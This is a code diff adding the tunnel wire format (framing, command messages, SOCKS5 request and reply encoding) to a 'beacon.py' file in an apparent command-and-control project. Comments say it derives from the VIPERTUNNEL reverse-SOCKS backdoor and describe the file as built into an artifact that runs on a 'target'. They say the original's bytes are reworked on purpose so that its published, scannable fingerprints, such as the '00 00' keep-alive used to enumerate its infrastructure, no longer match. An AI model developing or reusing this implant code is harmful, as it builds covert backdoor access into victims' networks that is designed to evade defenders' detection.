@@ -1111,6 +1111,441 @@ class NoiseSession:
                 % (what, len(message), self.MAX_MESSAGE_LEN))
 
 
+# ── Tunnel wire format: framing, command messages and SOCKS5 ──
+
+# This layer is derived from VIPERTUNNEL, the Python reverse-SOCKS backdoor
+# InfoGuard Labs documented in "Slithering Through the Noise" (2026-04-09).
+# It keeps that protocol's shape and replaces its bytes, and the
+# replacements will read as bugs to anybody who knows the original:
+#
+#   | Field          | The original            | Here                      |
+#   |----------------|-------------------------|---------------------------|
+#   | SOCKS version  | stripped from both ends | restored, 0x05, checked   |
+#   | RSV            | absent                  | present, 0x00, checked    |
+#   | Ports          | little-endian           | big-endian, RFC 1928 §4   |
+#   | Success        | 1, with 0 for failure   | 0, per RFC 1928 §6        |
+#   | ATYP=4, IPv6   | refused                 | supported                 |
+#   | Keep-alive     | a zero uint16, `00 00`  | MSG_PING / MSG_PONG       |
+#
+# The frame length prefix is big-endian for the same reason the ports are,
+# and not because anything here needs it that way: the original's
+# little-endian numbers are a published, scannable trait, and a fingerprint
+# we do not need is one we do not keep. `00 00` on connect is how its
+# infrastructure was enumerated across hosting providers, so an empty frame
+# -- which is those two bytes exactly -- is refused at both ends here
+# rather than merely going unused.
+#
+# The wire, outermost first:
+#
+#   frame           = ">H" length + one Noise message
+#   command message = kind(1) + compact JSON object        (inside Noise)
+#   SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
+#   SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")
+#
+# What is deliberately absent is the SOCKS greeting and the RFC 1929
+# username/password sub-negotiation. Only the operator-facing side performs
+# those, and that side is never delivered to a target, so neither belongs in
+# this file.
+#
+# This section lives in `beacon.py` because `api_beacon_gen` reads exactly
+# this one file to build the artifact the tunnel endpoint runs from. A
+# helper in another module would pass every test here and be absent on
+# target. `software/c2/tunnel/protocol.py` re-exports these names for the
+# server side; it holds no second copy.
+
+# The frame length prefix and the SOCKS port, which are the two places the
+# original used little-endian and so the two a reader will check. One
+# struct for both, because they are one decision.
+_BE_UINT16 = struct.Struct(">H")
+
+FRAME_PREFIX_LEN = _BE_UINT16.size
+
+# A frame carries one Noise message, so its ceiling is Noise's own -- and
+# that is exactly what a `>H` prefix can express, so a frame that fits the
+# prefix always fits the cipher and there is no third limit to keep in step.
+MAX_FRAME_LEN = NoiseSession.MAX_MESSAGE_LEN
+
+# The plaintext ceiling, a frame's worth less the GCM tag. Aliased from the
+# session rather than written as a number again: two names for 65519 is one
+# too many, and the second would be the one that goes stale.
+MAX_PAYLOAD_LEN = NoiseSession.MAX_PAYLOAD_LEN
+
+
+def write_frame(sock: socket.socket, payload: bytes) -> None:
+    """Write one length-prefixed frame, or refuse before touching `sock`.
+
+    Both refusals happen before any byte goes out, because a prefix on the
+    wire with nothing behind it leaves the peer unable to read the stream
+    ever again and there is no way to take it back. The prefix and the body
+    go in one `sendall` for the same reason -- two calls can interleave
+    with another thread's frame on the same socket.
+    """
+    if not payload:
+        raise ValueError(
+            "an empty frame is the two bytes 00 00 on the wire, which is "
+            "the inherited keep-alive this protocol exists not to send")
+    if len(payload) > MAX_FRAME_LEN:
+        raise ValueError(
+            "frame payload is %d bytes; a `>H` prefix tops out at %d"
+            % (len(payload), MAX_FRAME_LEN))
+    sock.sendall(_BE_UINT16.pack(len(payload)) + payload)
+
+
+def read_frame(sock: socket.socket) -> bytes:
+    """One whole frame's payload, or a ValueError.
+
+    A peer that closes mid-frame raises, and so does one that stalls past
+    the socket's own timeout -- the caller sets that, because how long to
+    wait is the caller's policy and not this function's. What never
+    happens is a short read returned as though it were a whole frame.
+    """
+    prefix = _read_exactly(sock, FRAME_PREFIX_LEN, "frame length prefix")
+    (length,) = _BE_UINT16.unpack(prefix)
+    if length == 0:
+        raise ValueError(
+            "a frame of length 0 is the inherited `00 00` keep-alive; this "
+            "protocol does not send it and does not accept it")
+    return _read_exactly(sock, length, "frame body")
+
+
+def _read_exactly(sock: socket.socket, count: int, what: str) -> bytes:
+    """Exactly `count` bytes, or a ValueError naming how far it got."""
+    chunks = []
+    have = 0
+    while have < count:
+        chunk = sock.recv(count - have)
+        if not chunk:
+            raise ValueError(
+                "the peer closed after %d of %d bytes of the %s"
+                % (have, count, what))
+        chunks.append(chunk)
+        have += len(chunk)
+    return b"".join(chunks)
+
+
+# ── Command messages ──
+
+MSG_HELLO = 1
+MSG_RELAY = 2
+MSG_OPEN_RELAY = 3
+MSG_PING = 4
+MSG_PONG = 5
+MSG_CLOSE = 6
+
+MESSAGE_KIND_NAMES = {
+    MSG_HELLO: "HELLO",
+    MSG_RELAY: "RELAY",
+    MSG_OPEN_RELAY: "OPEN_RELAY",
+    MSG_PING: "PING",
+    MSG_PONG: "PONG",
+    MSG_CLOSE: "CLOSE",
+}
+
+MESSAGE_KINDS = tuple(sorted(MESSAGE_KIND_NAMES))
+
+
+def _code_list(table: dict) -> str:
+    """`1 (HELLO), 2 (RELAY)` -- what an error says it expected instead.
+
+    Built from the table rather than written out, so a renumbering cannot
+    leave an error message describing the protocol as it used to be.
+    """
+    return ", ".join("%d (%s)" % (code, table[code])
+                     for code in sorted(table))
+
+
+def encode_message(kind: int, body: dict) -> bytes:
+    """One command message: a kind byte and a compact JSON object.
+
+    JSON rather than a packed struct because this channel carries a handful
+    of messages an hour, so being able to read a capture of our own test
+    rig is worth more than the bytes. Keys are sorted, so the same body
+    always encodes to the same bytes and two captures diff cleanly.
+    """
+    if kind not in MESSAGE_KIND_NAMES:
+        raise ValueError("message kind %r is not one of %s"
+                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
+    if not isinstance(body, dict):
+        raise ValueError("a message body is a JSON object, not %s"
+                         % type(body).__name__)
+    try:
+        text = json.dumps(body, separators=(",", ":"), sort_keys=True)
+    except (TypeError, ValueError):
+        text = None
+    # Raised outside the except block, and without the body in it: a body
+    # holds a session token and a hostname, and neither belongs in a log.
+    if text is None:
+        raise ValueError("a %s body must be JSON-serialisable with string "
+                         "keys" % MESSAGE_KIND_NAMES[kind])
+    raw = bytes([kind]) + text.encode("utf-8")
+    if len(raw) > MAX_PAYLOAD_LEN:
+        raise ValueError(
+            "a %s message encodes to %d bytes; at most %d fits in one "
+            "Noise message" % (MESSAGE_KIND_NAMES[kind], len(raw),
+                               MAX_PAYLOAD_LEN))
+    return raw
+
+
+def decode_message(raw: bytes) -> Tuple[int, dict]:
+    """The kind and body of one command message, or a ValueError."""
+    data = bytes(raw)
+    if not data:
+        raise ValueError("a command message is at least a kind byte")
+    kind = data[0]
+    if kind not in MESSAGE_KIND_NAMES:
+        raise ValueError("message kind %d is not one of %s"
+                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
+    try:
+        # json.JSONDecodeError and UnicodeDecodeError are both ValueErrors.
+        body = json.loads(data[1:].decode("utf-8"))
+    except ValueError:
+        body = None
+    if not isinstance(body, dict):
+        raise ValueError("the body of a %s message is not a JSON object"
+                         % MESSAGE_KIND_NAMES[kind])
+    return kind, body
+
+
+# ── SOCKS5 requests and replies, RFC 1928 §4 and §6 ──
+
+SOCKS_VERSION = 5
+
+# RFC 1928 reserves byte 3 of both messages and fixes it at zero. The
+# original dropped it; a non-zero one here is a malformed message.
+_SOCKS_RESERVED = 0
+
+# ver | cmd-or-rep | rsv | atyp, before the address.
+_SOCKS_HEADER_LEN = 4
+
+CMD_CONNECT = 1
+CMD_BIND = 2
+CMD_UDP_ASSOCIATE = 3
+
+SOCKS_COMMAND_NAMES = {
+    CMD_CONNECT: "CONNECT",
+    CMD_BIND: "BIND",
+    CMD_UDP_ASSOCIATE: "UDP ASSOCIATE",
+}
+
+# Only CONNECT is answered. The other two still decode, because a peer that
+# asks for one has to be refused with REPLY_COMMAND_NOT_SUPPORTED, and a
+# refusal cannot be sent for a request that never parsed -- a parse error
+# is indistinguishable, from the far end, from a tunnel that has died.
+SUPPORTED_COMMANDS = (CMD_CONNECT,)
+
+ATYP_IPV4 = 1
+ATYP_DOMAIN = 3
+ATYP_IPV6 = 4
+
+SOCKS_ADDRESS_TYPE_NAMES = {
+    ATYP_IPV4: "IPv4",
+    ATYP_DOMAIN: "domain name",
+    ATYP_IPV6: "IPv6",
+}
+
+REPLY_SUCCEEDED = 0
+REPLY_GENERAL_FAILURE = 1
+REPLY_NOT_ALLOWED = 2
+REPLY_NETWORK_UNREACHABLE = 3
+REPLY_HOST_UNREACHABLE = 4
+REPLY_CONNECTION_REFUSED = 5
+REPLY_TTL_EXPIRED = 6
+REPLY_COMMAND_NOT_SUPPORTED = 7
+REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8
+
+SOCKS_REPLY_NAMES = {
+    REPLY_SUCCEEDED: "succeeded",
+    REPLY_GENERAL_FAILURE: "general SOCKS server failure",
+    REPLY_NOT_ALLOWED: "connection not allowed by ruleset",
+    REPLY_NETWORK_UNREACHABLE: "network unreachable",
+    REPLY_HOST_UNREACHABLE: "host unreachable",
+    REPLY_CONNECTION_REFUSED: "connection refused",
+    REPLY_TTL_EXPIRED: "TTL expired",
+    REPLY_COMMAND_NOT_SUPPORTED: "command not supported",
+    REPLY_ADDRESS_TYPE_NOT_SUPPORTED: "address type not supported",
+}
+
+
+def socks_command_supported(cmd: int) -> bool:
+    """Whether this end answers `cmd` rather than refusing it.
+
+    Separate from `decode_socks_request` on purpose, so that a BIND or UDP
+    ASSOCIATE request decodes and the caller can answer it with
+    REPLY_COMMAND_NOT_SUPPORTED.
+    """
+    return cmd in SUPPORTED_COMMANDS
+
+
+def encode_socks_request(cmd: int, atyp: int, address: str,
+                         port: int) -> bytes:
+    """One SOCKS5 request, RFC 1928 §4.
+
+    `atyp` is passed rather than inferred from `address`: the operator-side
+    proxy relays what its client asked for, and a client that sends ATYP=3
+    with something that happens to look like an IP literal must still be
+    relayed as a name.
+    """
+    if cmd not in SOCKS_COMMAND_NAMES:
+        raise ValueError("SOCKS command %r is not one of %s"
+                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
+    return _encode_socks_envelope(cmd, atyp, address, port)
+
+
+def decode_socks_request(raw: bytes) -> Tuple[int, int, str, int]:
+    """`(cmd, atyp, address, port)` from one whole SOCKS5 request.
+
+    `raw` must be exactly one request and nothing else: on this protocol a
+    request arrives as its own frame, so trailing bytes are a malformed
+    message rather than the beginning of the relayed stream. A reader
+    pulling requests out of a raw TCP stream has to delimit them itself.
+    """
+    cmd, atyp, address, port = _decode_socks_envelope(raw, "request")
+    if cmd not in SOCKS_COMMAND_NAMES:
+        raise ValueError("SOCKS command %d is not one of %s"
+                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
+    return cmd, atyp, address, port
+
+
+def encode_socks_reply(reply: int, atyp: int = ATYP_IPV4,
+                       address: str = "0.0.0.0", port: int = 0) -> bytes:
+    """One SOCKS5 reply, RFC 1928 §6, where `REPLY_SUCCEEDED` is 0.
+
+    The bound address defaults to `0.0.0.0:0` because RFC 1928 leaves
+    BND.ADDR and BND.PORT meaningless when the reply is not a success, and
+    every refusal path would otherwise have to invent one.
+    """
+    if reply not in SOCKS_REPLY_NAMES:
+        raise ValueError("SOCKS reply code %r is not one of %s"
+                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
+    return _encode_socks_envelope(reply, atyp, address, port)
+
+
+def decode_socks_reply(raw: bytes) -> Tuple[int, int, str, int]:
+    """`(reply, atyp, address, port)` from one whole SOCKS5 reply."""
+    reply, atyp, address, port = _decode_socks_envelope(raw, "reply")
+    if reply not in SOCKS_REPLY_NAMES:
+        raise ValueError("SOCKS reply code %d is not one of %s"
+                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
+    return reply, atyp, address, port
+
+
+def _encode_socks_envelope(code: int, atyp: int, address: str,
+                           port: int) -> bytes:
+    """`ver | code | rsv | atyp | addr | port`, where `code` is the CMD of
+    a request or the REP of a reply.
+
+    Shared because those two messages differ in nothing else, and a layout
+    written down twice is a layout that gets corrected once.
+    """
+    if not isinstance(address, str):
+        raise ValueError("a SOCKS address is text, not %s"
+                         % type(address).__name__)
+    if not isinstance(port, int) or not 0 <= port <= 0xFFFF:
+        raise ValueError("port %r is not a uint16" % (port,))
+    return (bytes([SOCKS_VERSION, code, _SOCKS_RESERVED, atyp])
+            + _encode_socks_address(atyp, address)
+            + _BE_UINT16.pack(port))
+
+
+def _decode_socks_envelope(raw: bytes,
+                           what: str) -> Tuple[int, int, str, int]:
+    data = bytes(raw)
+    if len(data) < _SOCKS_HEADER_LEN:
+        raise ValueError(
+            "a SOCKS %s opens with %d bytes of header; this one is %d "
+            "bytes long in total" % (what, _SOCKS_HEADER_LEN, len(data)))
+    if data[0] != SOCKS_VERSION:
+        raise ValueError(
+            "a SOCKS %s opens with version %d; this one says %d"
+            % (what, SOCKS_VERSION, data[0]))
+    if data[2] != _SOCKS_RESERVED:
+        raise ValueError(
+            "RFC 1928 reserves byte 3 of a %s and fixes it at 0x%02x; this "
+            "one is 0x%02x" % (what, _SOCKS_RESERVED, data[2]))
+    atyp = data[3]
+    address, used = _decode_socks_address(data[_SOCKS_HEADER_LEN:], atyp,
+                                          what)
+    expected = _SOCKS_HEADER_LEN + used + _BE_UINT16.size
+    if len(data) != expected:
+        raise ValueError(
+            "a SOCKS %s with this address is %d bytes; this one is %d"
+            % (what, expected, len(data)))
+    (port,) = _BE_UINT16.unpack(data[expected - _BE_UINT16.size:])
+    # Byte 1 is the CMD of a request and the REP of a reply; which one it
+    # is, and whether this end knows that value, is the caller's to say.
+    return data[1], atyp, address, port
+
+
+def _encode_socks_address(atyp: int, address: str) -> bytes:
+    if atyp == ATYP_IPV4:
+        return _pack_socks_ip(socket.AF_INET, address, "an IPv4 address")
+    if atyp == ATYP_IPV6:
+        return _pack_socks_ip(socket.AF_INET6, address, "an IPv6 address")
+    if atyp == ATYP_DOMAIN:
+        name = address.encode("utf-8")
+        if not name:
+            raise ValueError("a SOCKS domain name cannot be empty")
+        if len(name) > 0xFF:
+            raise ValueError(
+                "a SOCKS domain name is %d bytes and its length byte tops "
+                "out at %d" % (len(name), 0xFF))
+        return bytes([len(name)]) + name
+    raise ValueError("SOCKS address type %r is not one of %s"
+                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))
+
+
+def _pack_socks_ip(family: int, address: str, what: str) -> bytes:
+    try:
+        packed = socket.inet_pton(family, address)
+    except (OSError, ValueError):
+        packed = None
+    if packed is None:
+        raise ValueError("%r is not %s" % (address, what))
+    return packed
+
+
+def _decode_socks_address(tail: bytes, atyp: int,
+                          what: str) -> Tuple[str, int]:
+    """The address in `tail`, and how many of its bytes it took."""
+    if atyp == ATYP_IPV4:
+        return _unpack_socks_ip(socket.AF_INET, tail, 4, what), 4
+    if atyp == ATYP_IPV6:
+        return _unpack_socks_ip(socket.AF_INET6, tail, 16, what), 16
+    if atyp == ATYP_DOMAIN:
+        if not tail:
+            raise ValueError("a SOCKS %s with ATYP=3 carries no length byte"
+                             % what)
+        length = tail[0]
+        if length == 0:
+            raise ValueError("a SOCKS %s carries an empty domain name"
+                             % what)
+        if len(tail) < 1 + length:
+            raise ValueError(
+                "a SOCKS %s promises a %d-byte domain name and carries %d "
+                "bytes of it" % (what, length, len(tail) - 1))
+        try:
+            name = tail[1:1 + length].decode("utf-8")
+        except ValueError:
+            name = None
+        # Refused rather than mangled with a replacement character: a name
+        # we cannot read is a name we must not silently resolve.
+        if name is None:
+            raise ValueError("the domain name in a SOCKS %s is not UTF-8"
+                             % what)
+        return name, 1 + length
+    raise ValueError("SOCKS address type %d is not one of %s"
+                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))
+
+
+def _unpack_socks_ip(family: int, tail: bytes, size: int,
+                     what: str) -> str:
+    if len(tail) < size:
+        raise ValueError(
+            "a SOCKS %s needs %d address bytes and carries %d"
+            % (what, size, len(tail)))
+    return socket.inet_ntop(family, tail[:size])
+
+
 # ── Stdlib DNS resolver (TXT + A records) ──
 
 # The resolver port. Named rather than written into the sendto call so a
